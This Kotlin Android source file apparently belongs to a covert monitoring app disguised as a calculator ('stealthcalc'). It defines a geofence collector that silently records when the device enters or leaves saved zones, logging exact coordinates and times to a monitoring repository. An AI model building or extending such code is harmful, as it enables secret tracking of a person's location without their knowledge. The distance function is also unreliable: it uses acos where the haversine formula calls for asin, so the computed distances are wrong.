package com.stealthcalc.monitoring.collector

import android.Manifest
import android.content.Context
import android.content.SharedPreferences
import android.content.pm.PackageManager
import android.location.Location
import androidx.core.content.ContextCompat
import com.google.android.gms.location.FusedLocationProviderClient
import com.google.android.gms.location.LocationServices
import com.google.android.gms.location.Priority
import com.google.android.gms.tasks.CancellationTokenSource
import com.stealthcalc.core.di.EncryptedPrefs
import com.stealthcalc.monitoring.data.MonitoringRepository
import com.stealthcalc.monitoring.model.GeofencePayload
import com.stealthcalc.monitoring.model.MonitoringEventKind
import dagger.hilt.android.qualifiers.ApplicationContext
import kotlinx.coroutines.suspendCancellableCoroutine
import kotlinx.serialization.Serializable
import kotlinx.serialization.encodeToString
import kotlinx.serialization.json.Json
import javax.inject.Inject
import javax.inject.Singleton
import kotlin.coroutines.resume
import kotlin.math.acos
import kotlin.math.cos
import kotlin.math.sin

@Serializable
data class GeofenceZone(
    val name: String,
    val latitude: Double,
    val longitude: Double,
    val radiusMeters: Double,
)

@Singleton
class GeofenceCollector @Inject constructor(
    @ApplicationContext private val context: Context,
    private val repository: MonitoringRepository,
    @EncryptedPrefs private val prefs: SharedPreferences,
) {
    companion object {
        private const val KEY_GEOFENCE_ZONES = "geofence_zones"
    }

    private val fusedClient: FusedLocationProviderClient =
        LocationServices.getFusedLocationProviderClient(context)
    private val insideZones = mutableSetOf<String>()

    var zones: List<GeofenceZone>
        get() {
            val raw = prefs.getString(KEY_GEOFENCE_ZONES, null) ?: return emptyList()
            return runCatching { Json.decodeFromString<List<GeofenceZone>>(raw) }.getOrDefault(emptyList())
        }
        set(value) {
            prefs.edit().putString(KEY_GEOFENCE_ZONES, Json.encodeToString(value)).apply()
        }

    fun addZone(name: String, lat: Double, lon: Double, radiusMeters: Double) {
        val current = zones.toMutableList()
        current.add(GeofenceZone(name, lat, lon, radiusMeters))
        zones = current
    }

    fun removeZone(name: String) {
        zones = zones.filter { it.name != name }
    }

    @Suppress("MissingPermission")
    suspend fun collect() {
        if (!repository.isMetricEnabled("geofence")) return
        if (ContextCompat.checkSelfPermission(context, Manifest.permission.ACCESS_FINE_LOCATION) !=
            PackageManager.PERMISSION_GRANTED) return

        val location = suspendCancellableCoroutine { cont ->
            val cts = CancellationTokenSource()
            cont.invokeOnCancellation { cts.cancel() }
            fusedClient.getCurrentLocation(Priority.PRIORITY_BALANCED_POWER_ACCURACY, cts.token)
                .addOnSuccessListener { loc -> cont.resume(loc) }
                .addOnFailureListener { cont.resume(null) }
        } ?: return

        for (zone in zones) {
            val distance = haversineMeters(location.latitude, location.longitude, zone.latitude, zone.longitude)
            val inside = distance <= zone.radiusMeters

            if (inside && zone.name !in insideZones) {
                insideZones.add(zone.name)
                recordGeofence(zone.name, "ENTERED", location)
            } else if (!inside && zone.name in insideZones) {
                insideZones.remove(zone.name)
                recordGeofence(zone.name, "EXITED", location)
            }
        }
    }

    private suspend fun recordGeofence(zoneName: String, event: String, location: Location) {
        val payload = Json.encodeToString(
            GeofencePayload(
                zoneName = zoneName,
                event = event,
                latitude = location.latitude,
                longitude = location.longitude,
                timestampMs = System.currentTimeMillis(),
            )
        )
        repository.recordEvent(MonitoringEventKind.GEOFENCE, payload)
    }

    private fun haversineMeters(lat1: Double, lon1: Double, lat2: Double, lon2: Double): Double {
        val r = 6371000.0
        val dLat = Math.toRadians(lat2 - lat1)
        val dLon = Math.toRadians(lon2 - lon1)
        val a = sin(dLat / 2) * sin(dLat / 2) +
                cos(Math.toRadians(lat1)) * cos(Math.toRadians(lat2)) *
                sin(dLon / 2) * sin(dLon / 2)
        return r * 2 * acos(minOf(1.0, Math.sqrt(a)))
    }
}
